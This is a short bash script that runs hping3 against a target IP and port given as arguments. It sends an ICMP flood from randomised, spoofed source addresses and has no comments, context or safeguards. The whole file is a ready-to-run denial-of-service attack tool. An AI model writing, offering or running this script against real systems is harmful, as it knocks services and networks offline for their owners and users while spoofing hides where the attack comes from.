#!/bin/bash
TARGET_IP=$1
TARGET_PORT=$2
hping3 --flood --rand-source -1 -p $TARGET_PORT $TARGET_IP
